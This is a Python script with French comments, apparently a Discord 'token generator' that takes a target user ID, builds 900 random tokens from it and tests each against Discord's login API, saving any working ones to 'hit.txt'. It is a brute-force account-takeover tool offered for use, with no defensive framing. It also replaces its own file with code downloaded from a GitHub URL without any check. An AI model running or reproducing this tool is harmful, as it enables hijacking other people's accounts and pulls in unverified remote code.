import base64
import os
import random
import string
import requests
from colorama import Fore, Style, init
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text

# Initialisation de Colorama
init(autoreset=True)

# Création de la console Rich
console = Console()

# URL pour vérifier les mises à jour
UPDATE_URL = "https://raw.githubusercontent.com/ErrorNoName/D-T-F/refs/heads/main/main.py"
LOCAL_SCRIPT = "main.py"

# Fonction pour vérifier et appliquer les mises à jour
def check_updates():
    console.print("[cyan]Vérification des mises à jour...[/cyan]")
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            with open(LOCAL_SCRIPT, "r") as local_file:
                if local_file.read() != response.text:
                    with open(LOCAL_SCRIPT, "w") as local_file:
                        local_file.write(response.text)
                    console.print("[green]Mise à jour appliquée. Redémarrez le script ![/green]")
                    exit()
                else:
                    console.print("[green]Script à jour ![/green]")
        else:
            console.print("[red]Impossible de vérifier les mises à jour.[/red]")
    except Exception as e:
        console.print(f"[red]Erreur lors de la vérification : {e}[/red]")

# Fonction pour générer un token
def generate_token(id_to_token):
    return (
        id_to_token + "." +
        ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "." +
        ''.join(random.choices(string.ascii_letters + string.digits, k=25))
    )

# Fonction principale
def main():
    # Logo ASCII
    logo = """


      █▒█                        
    ███████                      
   █░███████                     
  ███████▓███████▒█              
 ███████  ██████████▓██▒███▓     
███████  ██  ▓▓██████████▓ ▓██   
█████   ▒█▓    ▒███▒▓▓▒  ▓█████  
███▓     ▒      ▓██      ███████ 
        ▒   ▒▒▒▓██     ░  ██████ 
        ▒█░    ██▓▓▓▒  ▒  ███████
        ███▓EZIO░      ░   ██████
        ▓███▓ D-T-F  ▓▓      ████ 
       █████░█▓██▓               
  ▓      █▓▓▒███████             
  ██     ██░▒█████▒██▓           
 ████   ████▒███████▓▒████       
 ▓   █ ▓██████████████████       
   ░   ▓▒█████████▓█████▓░       
     ██   ██▓      ▒███          


    """
    console.print(Text(logo, justify="center", style="bold cyan"))
    
    # Vérification des mises à jour
    check_updates()

    # Demander l'ID utilisateur
    console.print("[cyan]Entrez votre ID pour générer les tokens :[/cyan]")
    id_input = input(Fore.CYAN + "ID TO TOKEN --> ")
    id_to_token = base64.b64encode(id_input.encode("ascii")).decode("ascii")

    valid_tokens = []
    invalid_tokens = []

    # Afficher l'interface avec Rich
    with Progress() as progress:
        task = progress.add_task("[cyan]Génération et vérification des tokens...[/cyan]", total=900)

        for _ in range(900):
            token = generate_token(id_to_token)
            headers = {'Authorization': token}
            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)

            if login.status_code == 200:
                valid_tokens.append(token)
                console.print(f"[green][+] VALID[/green] {token}")
            else:
                invalid_tokens.append(token)
                console.print(f"[red][-] INVALID[/red] {token}")

            progress.advance(task, 1)

    # Résultats
    console.print(Panel(f"[green]Tokens valides :[/green]\n" + "\n".join(valid_tokens), title="Valid Tokens"))
    console.print(Panel(f"[red]Tokens invalides :[/red]\n" + "\n".join(invalid_tokens), title="Invalid Tokens"))

    # Enregistrer les tokens valides dans un fichier
    console.print("[cyan]Enregistrement des tokens valides dans 'hit.txt'...[/cyan]")
    with open("hit.txt", "w") as file:
        for token in valid_tokens:
            file.write(f"{token}\n")
    console.print("[green]Enregistrement terminé ![/green]")

# Exécution principale
if __name__ == "__main__":
    main()
